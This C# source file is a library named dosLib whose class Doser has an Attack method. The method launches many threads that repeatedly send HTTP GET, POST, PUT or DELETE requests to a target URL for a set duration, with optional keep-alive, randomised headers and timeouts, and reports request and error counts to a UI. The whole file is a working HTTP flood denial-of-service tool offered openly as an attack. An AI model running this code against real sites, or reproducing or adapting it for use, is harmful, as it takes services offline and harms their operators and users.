using System;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Runtime.CompilerServices;

namespace dosLib
{
    public enum HttpMethodType
    {
        GET, POST, PUT, DELETE
    }
    public class Doser
    {
        private CancellationTokenSource cts;
        private readonly List<Task> activeTasks = new List<Task>();

        // Stats
        private int totalRequestsSent = 0;
        private int totalErrors = 0;
        private int activeThreads = 0;

        private DateTime startTime;
        private int durationInSeconds;


        // Notify the main UI about the stats update
        public event Action<int, int, int, int> StatsUpdated;

        public TimeSpan ElapsedTime => DateTime.UtcNow - startTime;

        // Method to get current stats
        public (int TotalRequests, int TotalErrors, int ActiveThreads, TimeSpan Elapsed) GetStats()
        {
            return (totalRequestsSent, totalErrors, activeThreads, ElapsedTime);
        }

        public void Attack(string targetURL, int threads, int requestsPerSecond, int durationInSeconds, HttpMethodType httpMethod, bool keepAlive, bool randomizeHeaders, bool followRedirects, int timeoutInMilliseconds)
        {
            this.durationInSeconds = durationInSeconds;
            startTime = DateTime.UtcNow;

            cts = new CancellationTokenSource();
            var token = cts.Token;
            var handler = new HttpClientHandler
            {
                AllowAutoRedirect = followRedirects
            };

            for (int i = 0; i < threads; i++)
            {
                var task = Task.Run(async () =>
                {
                    Interlocked.Increment(ref activeThreads);
                    using (var client = new HttpClient(handler, disposeHandler: false))
                    {
                        client.Timeout = TimeSpan.FromMilliseconds(timeoutInMilliseconds);
                        var endTime = DateTime.UtcNow.AddSeconds(durationInSeconds);
                        var delay = Math.Max(1, 1000 / requestsPerSecond);
                        DateTime lastStatsUpdate = DateTime.MinValue;

                        while (DateTime.UtcNow < endTime && !token.IsCancellationRequested)
                        {
                            try
                            {
                                var request = new HttpRequestMessage(GetMethod(httpMethod), targetURL);

                                if (keepAlive)
                                    request.Headers.Connection.Add("keep-alive");

                                if (randomizeHeaders)
                                    request.Headers.Add("X-Random", Guid.NewGuid().ToString());

                                await client.SendAsync(request, token);
                                Interlocked.Increment(ref totalRequestsSent);
                            }
                            catch
                            {
                                Interlocked.Increment(ref totalErrors);
                            }

                            if ((DateTime.UtcNow - lastStatsUpdate).TotalSeconds >= 1)
                            {
                                lastStatsUpdate = DateTime.UtcNow;
                                int progressPercent = (int)((DateTime.UtcNow - startTime).TotalSeconds * 100.0 / durationInSeconds);
                                if (progressPercent > 100) progressPercent = 100;
                                StatsUpdated?.Invoke(totalRequestsSent, totalErrors, activeThreads, progressPercent);
                            }

                            await Task.Delay(delay, token);
                        }
                    }

                    Interlocked.Decrement(ref activeThreads);
                    StatsUpdated?.Invoke(totalRequestsSent, totalErrors, activeThreads, 100);

                }, token);

                activeTasks.Add(task);
            }
        }

        public async Task TerminateAsync()
        {
            if (cts != null)
            {
                cts.Cancel();

                try
                {
                    await Task.WhenAll(activeTasks);
                }
                catch (OperationCanceledException)
                {
                    // Expected when tasks are cancelled
                }
                activeTasks.Clear();
            }
        }

        private System.Net.Http.HttpMethod GetMethod(HttpMethodType methodType)
        {
            switch (methodType)
            {
                case HttpMethodType.GET:
                    return HttpMethod.Get;
                case HttpMethodType.POST:
                    return HttpMethod.Post;
                case HttpMethodType.PUT:
                    return HttpMethod.Put;
                case HttpMethodType.DELETE:
                    return HttpMethod.Delete;
                default:
                    return HttpMethod.Get;
            }
        }
    }
}
